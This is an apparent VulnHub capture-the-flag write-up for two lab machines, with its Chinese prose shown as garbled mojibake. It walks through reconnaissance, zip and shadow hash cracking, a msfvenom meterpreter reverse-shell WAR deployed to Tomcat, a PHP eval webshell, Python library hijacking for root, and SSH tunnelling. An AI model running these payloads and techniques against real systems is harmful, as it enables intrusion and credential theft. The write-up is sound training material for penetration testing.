# vulnhub

## Corrosion: 2

Nmap æ‰«æ IP åœ°å€ã€‚

```
msf6 > db_nmap -sP -PR -T 5 -n 10.10.10.0/24
[*] Nmap: Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-02 07:30 UTC
[*] Nmap: Nmap scan report for 10.10.10.1
[*] Nmap: Host is up (0.00047s latency).
[*] Nmap: MAC Address: 00:50:56:C0:00:0A (VMware)
[*] Nmap: Nmap scan report for 10.10.10.103
[*] Nmap: Host is up (0.00016s latency).
[*] Nmap: MAC Address: 00:0C:29:25:CD:30 (VMware)
[*] Nmap: Nmap scan report for 10.10.10.200
[*] Nmap: Host is up (0.000082s latency).
[*] Nmap: MAC Address: 00:50:56:FA:67:12 (VMware)
[*] Nmap: Nmap scan report for 10.10.10.10
[*] Nmap: Host is up.
[*] Nmap: Nmap done: 256 IP addresses (4 hosts up) scanned in 1.53 seconds
```

```
address       mac                name  os_name  os_flavor  os_sp  purpose  info  comments
-------       ---                ----  -------  ---------  -----  -------  ----  --------
10.10.10.1    00:50:56:C0:00:0A
10.10.10.10
10.10.10.103  00:0C:29:25:CD:30
10.10.10.200  00:50:56:FA:67:12
```

æ³¨ï¼šæ­¤å¤„é€šè¿‡æ’é™¤æ³•ç¡®å®š 10.10.10.103 æ˜¯é¶æœºï¼ˆå› ä¸ºå…¶ä»–æœºå™¨å…¨æ˜¯æˆ‘çš„ï¼‰ã€‚



Nmap æ‰«æ IP çš„ TCP ç«¯å£ä¿¡æ¯å’Œæ“ä½œç³»ç»Ÿä¿¡æ¯ã€‚

```
msf6 > db_nmap -sS -sV -p- -r -n -T 5 -O 10.10.10.103
[*] Nmap: Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-02 07:35 UTC
[*] Nmap: Nmap scan report for 10.10.10.103
[*] Nmap: Host is up (0.00040s latency).
[*] Nmap: Not shown: 65532 closed tcp ports (reset)
[*] Nmap: PORT     STATE SERVICE VERSION
[*] Nmap: 22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
[*] Nmap: 80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
[*] Nmap: 8080/tcp open  http    Apache Tomcat 9.0.53
[*] Nmap: MAC Address: 00:0C:29:25:CD:30 (VMware)
[*] Nmap: Device type: general purpose|router
[*] Nmap: Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
[*] Nmap: OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
[*] Nmap: OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
[*] Nmap: Network Distance: 1 hop
[*] Nmap: Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
[*] Nmap: OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 9.28 seconds
```

```
host          port  proto  name  state  info
----          ----  -----  ----  -----  ----
10.10.10.103  22    tcp    ssh   open   OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 Ubuntu Linux; protocol 2.0
10.10.10.103  80    tcp    http  open   Apache httpd 2.4.41 (Ubuntu)
10.10.10.103  8080  tcp    http  open   Apache Tomcat 9.0.53
```

æ³¨ï¼šå­˜åœ¨ä¸¤ä¸ªç½‘ç«™ï¼Œé€šè¿‡æµè§ˆå™¨è®¿é—®ï¼Œæœªå‘ç°æœ‰ç”¨çš„ä¿¡æ¯ã€‚



å°è¯•ä½¿ç”¨ FFUF æ‰«æ 80 ç«¯å£çš„ç½‘é¡µ

```
ffuf -u http://10.10.10.103/indexFUZZ -w web-extensions-big.txt

.html                   [Status: 200, Size: 10918, Words: 3499, Lines: 376, Duration: 5ms]
.html                   [Status: 200, Size: 10918, Words: 3499, Lines: 376, Duration: 2ms]
:: Progress: [66886/66886] :: Job [1/1] :: 18181 req/sec :: Duration: [0:00:02] :: Errors: 0 ::
```

```
ffuf -u http://10.10.10.103/FUZZ -w raft-medium-files-lowercase.txt

index.html              [Status: 200, Size: 10918, Words: 3499, Lines: 376, Duration: 2ms]
.htaccess               [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 0ms]
.                       [Status: 200, Size: 10918, Words: 3499, Lines: 376, Duration: 1ms]
.html                   [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 1ms]
.htpasswd               [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 1ms]
.htm                    [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 0ms]
.htpasswds              [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 0ms]
.htgroup                [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 1ms]
.htaccess.bak           [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 0ms]
.htuser                 [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 1ms]
.ht                     [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 1ms]
.htc                    [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 1ms]
:: Progress: [16244/16244] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0 ::
```

æ³¨ï¼šæ²¡æœ‰å‘ç°ä»»ä½•æœ‰ç”¨çš„ä¿¡æ¯ã€‚ä»¥ . å¼€å¤´çš„ .xxx 403 ä¿¡æ¯æ˜¯è¯¯æŠ¥ã€‚



å°è¯•ä½¿ç”¨ FFUF æ‰«æ 8080 ç«¯å£çš„ç½‘é¡µ

```
ffuf -u http://10.10.10.103:8080/indexFUZZ -w web-extensions-big.txt
.jsp                    [Status: 200, Size: 11136, Words: 4198, Lines: 199, Duration: 37ms]
.jsp                    [Status: 200, Size: 11136, Words: 4198, Lines: 199, Duration: 14ms]
:: Progress: [66886/66886] :: Job [1/1] :: 13333 req/sec :: Duration: [0:00:13] :: Errors: 0 ::
```

```
ffuf -u http://10.10.10.103:8080/FUZZ -w raft-large-files-lowercase.txt

favicon.ico             [Status: 200, Size: 21630, Words: 19, Lines: 22, Duration: 22ms]
.                       [Status: 200, Size: 11136, Words: 4198, Lines: 199, Duration: 6ms]
index.jsp               [Status: 200, Size: 11136, Words: 4198, Lines: 199, Duration: 3ms]
readme.txt              [Status: 200, Size: 153, Words: 28, Lines: 3, Duration: 7ms]
backup.zip              [Status: 200, Size: 33723, Words: 146, Lines: 121, Duration: 7ms]
:: Progress: [35325/35325] :: Job [1/1] :: 12500 req/sec :: Duration: [0:00:05] :: Errors: 0 ::
```

å‘ç° backup.zip æ–‡ä»¶ï¼Œå¯èƒ½æ˜¯ç®¡ç†å‘˜åœ¨å¤‡ä»½æ—¶å¿½è§†å¤§æ„å¿˜è®°åˆ é™¤äº†ï¼Œé€šè¿‡ HTTP æœåŠ¡æš´éœ²å‡ºæ¥äº†ã€‚



ä½¿ç”¨ words å­—å…¸é…åˆ .jsp,.zip,.txt è¿›è¡Œæ‰«æã€‚

```
ffuf -u http://10.10.10.103:8080/FUZZ -w raft-medium-words-lowercase.txt -e .jsp,.zip,.txt

index.jsp               [Status: 200, Size: 11136, Words: 4198, Lines: 199, Duration: 5ms]
docs                    [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 3ms]
backup.zip              [Status: 200, Size: 33723, Words: 146, Lines: 121, Duration: 4ms]
manager                 [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 1ms]
.                       [Status: 200, Size: 11136, Words: 4198, Lines: 199, Duration: 3ms]
readme.txt              [Status: 200, Size: 153, Words: 28, Lines: 3, Duration: 1ms]
examples                [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 3ms]
:: Progress: [225172/225172] :: Job [1/1] :: 1818 req/sec :: Duration: [0:00:39] :: Errors: 0 ::
```



ç«¯å£æ‰«ææ—¶å‘ç° 8080 æ˜¯ tomcat æœåŠ¡å™¨ï¼Œmanager æ˜¯ tomcat æœåŠ¡å™¨çš„ web ç®¡ç†é¡µé¢ã€‚

è®¿é—®é¡µé¢éœ€è¦æä¾›è´¦å·å¯†ç ã€‚

![image-20250302162514632](./images/vulnhub.assets/image-20250302162514632.png)



ä¸‹è½½å‹ç¼©åŒ…ï¼Œçœ‹çœ‹å…¶ä¸­æ˜¯å¦å­˜åœ¨å¯ç”¨ä¿¡æ¯ã€‚

```
root@xiaoshae:/opt# wget http://10.10.10.103:8080/backup.zip
--2025-03-02 18:30:07--  http://10.10.10.103:8080/backup.zip
Connecting to 10.10.10.103:8080... connected.
HTTP request sent, awaiting response... 200 
Length: 33723 (33K) [application/zip]
Saving to: â€˜backup.zipâ€™

backup.zip                               100%[===============================================================================>]  32.93K  --.-KB/s    in 0s      

2025-03-02 18:30:07 (892 MB/s) - â€˜backup.zipâ€™ saved [33723/33723]
```



å°è¯•è§£å‹ï¼Œå‘ç°éœ€è¦è´¦å·å¯†ç 

```
unzip backup.zip 
Archive:  backup.zip
[backup.zip] catalina.policy password: root
```



ä½¿ç”¨ zip2john æå– hash 

```
zip2john backup.zip > hash 

ver 2.0 efh 5455 efh 7875 backup.zip/catalina.policy PKZIP Encr: TS_chk, cmplen=2911, decmplen=13052, crc=AD0C6FDB ts=6920 cs=6920 type=8
ver 2.0 efh 5455 efh 7875 backup.zip/context.xml PKZIP Encr: TS_chk, cmplen=721, decmplen=1400, crc=59B9F4E7 ts=6920 cs=6920 type=8
ver 2.0 efh 5455 efh 7875 backup.zip/catalina.properties PKZIP Encr: TS_chk, cmplen=2210, decmplen=7276, crc=1CD3C095 ts=6920 cs=6920 type=8
ver 2.0 efh 5455 efh 7875 backup.zip/jaspic-providers.xml PKZIP Encr: TS_chk, cmplen=626, decmplen=1149, crc=748A87A6 ts=6920 cs=6920 type=8
ver 2.0 efh 5455 efh 7875 backup.zip/jaspic-providers.xsd PKZIP Encr: TS_chk, cmplen=862, decmplen=2313, crc=3B44D150 ts=6920 cs=6920 type=8
ver 2.0 efh 5455 efh 7875 backup.zip/logging.properties PKZIP Encr: TS_chk, cmplen=1076, decmplen=4144, crc=1D6C26F7 ts=6920 cs=6920 type=8
ver 2.0 efh 5455 efh 7875 backup.zip/server.xml PKZIP Encr: TS_chk, cmplen=2609, decmplen=7589, crc=F91AC0C0 ts=6920 cs=6920 type=8
ver 2.0 efh 5455 efh 7875 backup.zip/tomcat-users.xml PKZIP Encr: TS_chk, cmplen=1167, decmplen=2972, crc=BDCB08B9 ts=B0E3 cs=b0e3 type=8
ver 2.0 efh 5455 efh 7875 backup.zip/tomcat-users.xsd PKZIP Encr: TS_chk, cmplen=858, decmplen=2558, crc=E8F588C2 ts=6920 cs=6920 type=8
ver 2.0 efh 5455 efh 7875 backup.zip/web.xml PKZIP Encr: TS_chk, cmplen=18917, decmplen=172359, crc=B8AF6070 ts=6920 cs=6920 type=8
NOTE: It is assumed that all files in each archive have the same password.
If that is not the case, the hash may be uncrackable. To avoid this, use
option -o to pick a file at a time.
```



å°è¯•çˆ†ç ´å¯†ç 

```
john --wordlist=rockyou.txt hash 

Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 8 OpenMP threads
Note: Passwords longer than 21 [worst case UTF-8] to 63 [ASCII] rejected
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
@administrator_hi5 (backup.zip)     
1g 0:00:00:01 DONE (2025-03-02 18:32) 0.9901g/s 11387Kp/s 11387Kc/s 11387KC/s @lexus1s..9Spruce
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

å¯†ç ä¸ºï¼š@administrator_hi5



è§£å‹å‹ç¼©åŒ…

```
unzip backup.zip

Archive:  backup.zip
[backup.zip] catalina.policy password: 
  inflating: catalina.policy         
  inflating: context.xml             
  inflating: catalina.properties     
  inflating: jaspic-providers.xml    
  inflating: jaspic-providers.xsd    
  inflating: logging.properties      
  inflating: server.xml              
  inflating: tomcat-users.xml        
  inflating: tomcat-users.xsd        
  inflating: web.xml
```



æŸ¥æ‰¾æ–‡ä»¶ä¿¡æ¯ï¼Œåœ¨ tomcat-users.xml æ–‡ä»¶ä¸­å‘ç° tomcat manager çš„å¯†ç ä¸º **melehifokivai**ã€‚

![image-20250302183425398](./images/vulnhub.assets/image-20250302183425398.png)



æˆåŠŸç™»å½• manager é¡µé¢ï¼Œå‘ç°å¯ä»¥éƒ¨ç½² war åº”ç”¨ç¨‹åº

![image-20250302183621629](./images/vulnhub.assets/image-20250302183621629.png)



ä½¿ç”¨ msfvenom ç”Ÿæˆé€‚ç”¨äº war çš„åå‘ shell

```
msfvenom -p java/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=8080 -f war -o shell.war

Payload size: 6210 bytes
Final size of war file: 6210 bytes
Saved as: shell.war
```



ä½¿ç”¨ msfconsole ç›‘å¬

```
msf6 > use exploit/multi/handler 
[*] Using configured payload generic/shell_reverse_tcp

msf6 exploit(multi/handler) > set PAYLOAD java/meterpreter/reverse_tcp 
PAYLOAD => java/meterpreter/reverse_tcp

msf6 exploit(multi/handler) > set LHOST 10.10.10.10
LHOST => 10.10.10.10

msf6 exploit(multi/handler) > set LPORT 8080
LPORT => 8080

msf6 exploit(multi/handler) > run
[*] Started reverse TCP handler on 10.10.10.10:8080 
```



åœ¨ manager ä¸­éƒ¨ç½² shell.war åº”ç”¨ç¨‹åº

![image-20250302184036642](./images/vulnhub.assets/image-20250302184036642.png)



éƒ¨ç½²æˆåŠŸåè®¿é—®é¡µé¢ï¼ˆé¡µé¢ä¸ºç©ºæ˜¯æ­£å¸¸æƒ…å†µï¼‰

![image-20250302184059909](./images/vulnhub.assets/image-20250302184059909.png)

![image-20250302184118563](./images/vulnhub.assets/image-20250302184118563.png)



åå‘ shell è¿æ¥æˆåŠŸ

```
msf6 exploit(multi/handler) > run
[*] Started reverse TCP handler on 10.10.10.10:8080 
[*] Sending stage (58073 bytes) to 10.10.10.103
[*] Meterpreter session 1 opened (10.10.10.10:8080 -> 10.10.10.103:58936) at 2025-03-02 10:41:02 +0000

meterpreter > background 
[*] Backgrounding session 1...
msf6 exploit(multi/handler) > 
```



æå‡ä¼šè¯

```
msf6 exploit(multi/handler) > sessions -u 1 
[*] Executing 'post/multi/manage/shell_to_meterpreter' on session(s): [1]
[!] SESSION may not be compatible with this module:
[!]  * missing Meterpreter features: stdapi_railgun_api, stdapi_sys_process_kill
[*] Upgrading session ID: 1
[*] Starting exploit/multi/handler
[*] Started reverse TCP handler on 10.10.10.10:4433 
[*] Command stager progress: 100.00% (773/773 bytes)

[*] Sending stage (1017704 bytes) to 10.10.10.103
msf6 exploit(multi/handler) > [*] Meterpreter session 2 opened (10.10.10.10:4433 -> 10.10.10.103:34140) at 2025-03-02 10:42:20 +0000
[*] Stopping exploit/multi/handler

msf6 exploit(multi/handler) > 
```



é€šè¿‡ Meterpreter æ”¶é›†ä¿¡æ¯

```
msf6 exploit(multi/handler) > sessions -i 2 
[*] Starting interaction with 2...

meterpreter > sysinfo 
Computer     : 10.10.10.103
OS           : Ubuntu 20.04 (Linux 5.11.0-34-generic)
Architecture : x64
BuildTuple   : i486-linux-musl
Meterpreter  : x86/linux
meterpreter > 
```



åœ¨ /home è·¯å¾„ä¸‹å­˜åœ¨ä¸¤ä¸ªç”¨æˆ·

```
tomcat@corrosion:/home$ ls
jaye
randy
```



å°è¯•æ’åº“æ”»å‡»ï¼Œä½¿ç”¨ manager çš„å¯†ç ï¼ˆ**melehifokivai**ï¼‰ï¼Œå» ssh ç™»å½•è¿™ä¸¤ä¸ªç”¨æˆ·ï¼Œå‘ç° jaye ç”¨æˆ·å¯†ç å’Œ manager å¯†ç ä¸€è‡´ã€‚

ç™»å½• jaye è´¦æˆ·åå‘ç°å…¶å­˜åœ¨ä¸€ä¸ª **SUID å’Œ SGID** çš„å¯æ‰§è¡Œæ–‡ä»¶ã€‚

- å½“ç”¨æˆ·æ‰§è¡Œè¯¥æ–‡ä»¶æ—¶ï¼Œè¿›ç¨‹çš„ **æœ‰æ•ˆç”¨æˆ· ID** ä¼šä¸´æ—¶å˜ä¸ºæ–‡ä»¶æ‰€æœ‰è€…ï¼ˆ`root`ï¼‰ã€‚
- è¿›ç¨‹çš„ **æœ‰æ•ˆç»„ ID** ä¼šä¸´æ—¶å˜ä¸ºæ–‡ä»¶æ‰€å±ç»„ï¼ˆ`root`ï¼‰ã€‚

```
jaye@corrosion:~/Files$ file look
look: setuid, setgid executable, regular file, no read permission
```



`look` æ˜¯ä¸€ä¸ªå‘½ä»¤è¡Œå·¥å…·ï¼Œé€šå¸¸ç”¨äºåœ¨ **å·²æ’åºçš„æ–‡ä»¶** ä¸­æŸ¥æ‰¾ä»¥ç‰¹å®šå­—ç¬¦ä¸²å¼€å¤´çš„è¡Œã€‚å®ƒçš„è¡Œä¸ºç±»ä¼¼äºç®€åŒ–çš„ `grep`ï¼Œä½†ä¸“ä¸ºå¿«é€ŸæŸ¥æ‰¾å‰ç¼€è®¾è®¡ã€‚

- `[-bdf]`ï¼šå¯é€‰å‚æ•°ï¼ˆé€‰é¡¹ï¼‰ï¼š
    - `-b`ï¼šåœ¨æŸ¥æ‰¾æ—¶å¿½ç•¥å­—ç¬¦ä¸²å‰çš„ç©ºç™½ï¼ˆå¦‚ç©ºæ ¼ã€åˆ¶è¡¨ç¬¦ï¼‰ã€‚
    - `-d`ï¼šä»…æ¯”è¾ƒå­—æ¯ã€æ•°å­—å’Œç©ºæ ¼ï¼ˆå¿½ç•¥å…¶ä»–å­—ç¬¦ï¼Œå¦‚æ ‡ç‚¹ç¬¦å·ï¼‰ã€‚
    - `-f`ï¼šå¿½ç•¥å¤§å°å†™ï¼ˆå¦‚å°† "A" å’Œ "a" è§†ä¸ºç›¸åŒï¼‰ã€‚
- `[-t char]`ï¼šæŒ‡å®šç»ˆæ­¢ç¬¦ï¼ˆ`char` æ˜¯ä¸€ä¸ªå­—ç¬¦ï¼‰ï¼Œä»…åŒ¹é…åˆ°è¯¥å­—ç¬¦å‰çš„å­—ç¬¦ä¸²ã€‚
- `string`ï¼šè¦æŸ¥æ‰¾çš„ **å‰ç¼€å­—ç¬¦ä¸²**ï¼ˆå¿…éœ€å‚æ•°ï¼‰ã€‚
- `[file ...]`ï¼šè¦æœç´¢çš„æ–‡ä»¶åˆ—è¡¨ï¼ˆå¯é€‰å‚æ•°ï¼Œé»˜è®¤å¯èƒ½ä½¿ç”¨ç³»ç»Ÿå­—å…¸æ–‡ä»¶ï¼‰ã€‚



å½“æ™®é€šç”¨æˆ· jaye æ‰§è¡Œ look å‘½ä»¤æ˜¯ï¼Œlook å‘½ä»¤ä¼šä»¥ root æƒé™è¿è¡Œï¼Œä½¿ç”¨ look è¯»å– /etc/shadow æ–‡ä»¶

```
jaye@corrosion:~/Files$ ./look '' /etc/shadow 
root:$6$fHvHhNo5DWsYxgt0$.3upyGTbu9RjpoCkHfW.1F9mq5dxjwcqeZl0KnwEr0vXXzi7Tld2lAeYeIio/9BFPjUCyaBeLgVH1yK.5OR57.:18888:0:99999:7:::
...
randy:$6$bQ8rY/73PoUA4lFX$i/aKxdkuh5hF8D78k50BZ4eInDWklwQgmmpakv/gsuzTodngjB340R1wXQ8qWhY2cyMwi.61HJ36qXGvFHJGY/:18888:0:99999:7:::
...
tomcat:$6$XD2Bs.tL01.5OT2b$.uXUR3ysfujHGaz1YKj1l9XUOMhHcKDPXYLTexsWbDWqIO9ML40CQZPI04ebbYzVNBFmgv3Mpd3.8znPfrBNC1:18888:0:99999:7:::
...
jaye:$6$Chqrqtd4U/B1J3gV$YjeAWKM.usyi/JxpfwYA6ybW/szqkiI1kerC4/JJNMpDUYKavQbnZeUh4WL/fB/4vrzX0LvKVWu60dq4SOQZB0:18887:0:99999:7:::
```



ä½¿ç”¨ john æˆåŠŸçˆ†ç ´ randy å¯†ç 

```
john â€” wordlist=/usr/share/wordlists/rockyou.txt hash.txt
...
07051986randy
```



åˆ‡æ¢åˆ° randy ç”¨æˆ·

```
jaye@corrosion:/home/randy$ su randy 
Password: 
randy@corrosion:~$ 
```



æŸ¥çœ‹ randy çš„ sudo æƒé™ï¼Œè¾“å‡ºæ˜¾ç¤º Randy å¯ä»¥ä½¿ç”¨æå‡çš„æƒé™è¿è¡Œ Python è„šæœ¬ã€‚

```
randy@corrosion:~$ sudo -l 
[sudo] password for randy: 
Matching Defaults entries for randy on corrosion:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User randy may run the following commands on corrosion:
    (root) PASSWD: /usr/bin/python3.8 /home/randy/randombase64.py
```



randombase64.py ä»… root ç”¨æˆ·å¯ä»¥ä¿®æ”¹ï¼ŒæŸ¥çœ‹è¿™ä¸ª python è„šæœ¬å‘ç°å…¶å¯¼å…¥ä¸€ä¸ª base64 åº“æ–‡ä»¶ã€‚

```
import base64

message = input("Enter your string: ")
message_bytes = message.encode('ascii')
base64_bytes = base64.b64encode(message_bytes)
base64_message = base64_bytes.decode('ascii')

print(base64_message)
randy@corrosion:~$ file randombase64.py 
randombase64.py: ASCII text
```



åŸºç¡€çš„ Python åº“åŠ«æŒæœ‰ **PYTHONPATHç¯å¢ƒå˜é‡ã€ç›´æ¥ä¿®æ”¹åº“æ–‡ä»¶ï¼ˆå…·æœ‰å†™æƒé™ï¼‰**ã€‚

å› ä¸º sudo å‘½ä»¤çš„å®‰å…¨è®¾ç½®ï¼Œ**ä¼šé‡ç½®ç¯å¢ƒå˜é‡**ï¼Œä¸”æ— æ³•è®¾ç½®ç¯å¢ƒå˜é‡ï¼Œæ‰€ä»¥ä¸å­˜åœ¨**PYTHONPATHç¯å¢ƒå˜é‡**ã€‚

```
randy@corrosion:/tmp/test$ sudo PYTHONPATH=/tmp/test/ /usr/bin/python3.8 /home/randy/randombase64.py 

sudo: sorry, you are not allowed to set the following environment variables: PYTHONPATH
```



æŸ¥çœ‹ Python æœç´¢åº“çš„è·¯å¾„

```
>>> import sys
>>> print("\n".join(sys.path))

/usr/lib/python38.zip
/usr/lib/python3.8
/usr/lib/python3.8/lib-dynload
/usr/local/lib/python3.8/dist-packages
/usr/lib/python3/dist-packages
```



åœ¨ç³»ç»Ÿä¸ŠæŸ¥æ‰¾æ‰€æœ‰ base64.py æ–‡ä»¶

```
locate base64.py

/home/randy/randombase64.py
/snap/core18/2128/usr/lib/python3.6/base64.py
/snap/gnome-3-34-1804/72/usr/lib/python2.7/base64.py
/snap/gnome-3-34-1804/72/usr/lib/python3.6/base64.py
/usr/lib/python3.8/base64.py
```



æŸ¥çœ‹æ–‡ä»¶çš„æƒé™ï¼ˆå…·æœ‰å†™å…¥æƒé™ï¼‰

```
-rwxrwxrwx 1 root root 20420 Mar  2 16:52 /usr/lib/python3.8/base64.py
```



ä¿®æ”¹ base64.py æ–‡ä»¶

![image-20250303085207798](./images/vulnhub.assets/image-20250303085207798.png)



sudo æ‰§è¡Œè„šæœ¬ï¼Œè·å¾— root æƒé™ã€‚

```
sudo /usr/bin/python3.8 /home/randy/randombase64.py 

[sudo] password for randy: 
root@corrosion:/tmp# id
uid=0(root) gid=0(root) groups=0(root)
```



## jangow01



Nmap æ‰«æ IP åœ°å€

```
nmap -sP -PR -n -T 5 10.10.10.0/24

...
MAC Address: 00:50:56:C0:00:0A (VMware)
Nmap scan report for 10.10.10.100
```



Nmap æ‰«æ TCP ç«¯å£ï¼Œå‘ç°ä¸€ä¸ª HTTP ç«™ç‚¹å’Œ VSFTPD ç«™ç‚¹ã€‚

```
db_nmap -sV -n -p- -r -T 5 -O 10.10.10.100

host          port  proto  name  state  info
----          ----  -----  ----  -----  ----
10.10.10.100  21    tcp    ftp   open   vsftpd 3.0.3
10.10.10.100  80    tcp    http  open   Apache httpd 2.4.18
```



ä½¿ç”¨ ffuf é«˜é¢‘æ–‡ä»¶å­—å…¸çˆ†ç ´ç½‘ç«™è·¯å¾„ï¼Œå‘ç° .backup æ–‡ä»¶ã€‚

```
ffuf -u http://10.10.10.100/FUZZ -w raft-large-files-lowercase.txt

...
.backup                 [Status: 200, Size: 336, Words: 30, Lines: 13, Duration: 10ms]
...
:: Progress: [35325/35325] :: Job [1/1] :: 74 req/sec :: Duration: [0:00:05] :: Errors: 0 ::
```



ä½¿ç”¨ wget ä¸‹è½½ .backup æ–‡ä»¶ï¼Œå‘ç°é‡Œé¢ä¸ºè¿æ¥æ•°æ®åº“çš„è´¦å·å’Œå¯†ç ã€‚

```
wget http://10.10.10.100/.backup -O backup

# æ–‡ä»¶å†…å®¹
$servername = "localhost";
$database = "jangow01";
$username = "jangow01";
$password = "abygurl69";
// Create connection
$conn = mysqli_connect($servername, $username, $password, $database);
// Check connection
if (!$conn) {
    die("Connection failed: " . mysqli_connect_error());
}
echo "Connected successfully";
mysqli_close($conn);
```



å°è¯•ä½¿ç”¨æ”¹è´¦å·å¯†ç ç™»å½• ftp æœåŠ¡å™¨ï¼Œç™»å½•æˆåŠŸï¼Œå¯èƒ½æ˜¯ç³»ç»Ÿç”¨æˆ·ã€‚

![image-20250304140204604](./images/vulnhub.assets/image-20250304140204604.png)



ä½¿ç”¨æµè§ˆå™¨è®¿é—®ç½‘ç«™ï¼Œå‘ç°ä¸€ä¸ªå‚æ•°å¯ä»¥æ‰§è¡Œå‘½ä»¤ï¼Œä»¥ä¸‹æ˜¯å‘ç°è¿‡ç¨‹ï¼š

![image-20250304140413616](./images/vulnhub.assets/image-20250304140413616.png)

![image-20250304140500353](./images/vulnhub.assets/image-20250304140500353.png)

![image-20250304140522856](./images/vulnhub.assets/image-20250304140522856.png)

![image-20250304140534450](./images/vulnhub.assets/image-20250304140534450.png)



å¯¹ä¸€å¥è¯æœ¨é©¬è¿›è¡Œ base64 ç¼–ç 

```
<?php eval($_POST['CMD']); ?>
```

```
PD9waHAgZXZhbCgkX1BPU1RbJ0NNRCddKTsgPz4=
```



ä½¿ç”¨ yakit ä¸Šä¼ ä¸€å¥è¯æœ¨é©¬

![image-20250304140840730](./images/vulnhub.assets/image-20250304140840730.png)



ä½¿ç”¨ä¸­å›½èšå‰‘è¿æ¥æˆåŠŸ

![image-20250304141035051](./images/vulnhub.assets/image-20250304141035051.png)



ç®€å•æµ‹è¯•å‘ç°é¶æœºå¯¹å…¥ç«™å’Œå‡ºç«™æµé‡åšäº†é™åˆ¶

![image-20250304141208731](./images/vulnhub.assets/image-20250304141208731.png)



ä½¿ç”¨ netstat -tunpl å‘ç°é¶æœºä¸­å¼€å¯äº† ssh æœåŠ¡ï¼Œç›‘å¬äº† 22 ç«¯å£ï¼Œä½†æ˜¯é…ç½®äº†é˜²ç«å¢™ç¦æ­¢ 22 ç«¯å£å…¥ç«™ã€‚

![image-20250304163418690](./images/vulnhub.assets/image-20250304163418690.png)



ä½¿ç”¨ Neo-reGeorg ç”Ÿæˆ php æ–‡ä»¶ï¼Œä¸Šä¼ åˆ°ç½‘ç«™ä¸­ã€‚

```
neoreg generate -k 123

    [+] Create neoreg server files:
       => neoreg_servers/tunnel.cs
       => neoreg_servers/tunnel.go
       => neoreg_servers/tunnel.ashx
       => neoreg_servers/tunnel.aspx
       => neoreg_servers/tunnel.php
       => neoreg_servers/tunnel.jsp
       => neoreg_servers/tunnel.jspx
```

![image-20250304162410860](./images/vulnhub.assets/image-20250304162410860.png)



ä½¿ç”¨ Neo-reGeorg å°†æœ¬åœ° 2222 ç«¯å£è½¬å‘åˆ°è¿œç¨‹ä¸»æœº 22 ç«¯å£ã€‚

```
neoreg -k 123 -u http://10.10.10.100/site/tunnel.php --php --read-interval 1 --write-interval 1 -l 0.0.0.0 -p 2222 -t 127.0.0.1:22

+------------------------------------------------------------------------+
  Log Level set to [ERROR]
  Starting Forward [0.0.0.0:2222] => [127.0.0.1:22]
  Tunnel at:
    http://10.10.10.100/site/tunnel.php
+------------------------------------------------------------------------+
```



ä½¿ç”¨æ³„éœ²çš„è´¦å·å¯†ç ï¼Œé€šè¿‡ 127.0.0.1:2222 è¿›è¡Œ ssh ç™»å½•ã€‚

```
ssh jangow01@127.0.0.1 -p 2222

jangow01@127.0.0.1's password: 
Welcome to Ubuntu 16.04.1 LTS (GNU/Linux 4.4.0-31-generic x86_64)
...
jangow01@jangow01:~$ 
```



å¦‚æœæƒ³è¦ msfconsole æ¥ç®¡ç³»ç»Ÿï¼Œå¿…é¡»åœ¨è¿œç¨‹ç«¯å£è½¬å‘ï¼Œå°†é¶æœºçš„æµé‡è½¬å‘åˆ°æ”»å‡»æœºã€‚

Neo-reGeorg å¯ä»¥å¾ˆå¥½çš„è¿›è¡Œæœ¬åœ°ç«¯å£è½¬å‘ï¼Œä½†ä¸å¤ªé€‚åˆè¿›è¡Œè¿œç¨‹ç«¯å£è½¬å‘ï¼Œä¸è¿‡å½“å‰å·²ç»å¯ä»¥è¿æ¥åˆ°é¶æœºçš„ ssh æœåŠ¡ï¼Œå¯ä»¥ä½¿ç”¨ ssh è‡ªå¸¦çš„è¿œç¨‹ç«¯å£è½¬å‘ã€‚

```
ssh jangow01@127.0.0.1 -p 2222 -R 4444:127.0.0.1:4444 -R 5555:127.0.0.1:5555 -Nf
```



åœ¨é¶æœºä¸Šæ‰§è¡Œ netstat -tunpl å‘½ä»¤ï¼Œå‘ç°å·²ç»ç›‘å¬ 4444 å’Œ 5555 ç«¯å£ã€‚

```
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name	
tcp        0      0 127.0.0.1:5555          0.0.0.0:*               LISTEN       -               
tcp        0      0 127.0.0.1:4444          0.0.0.0:*               LISTEN       -               
```



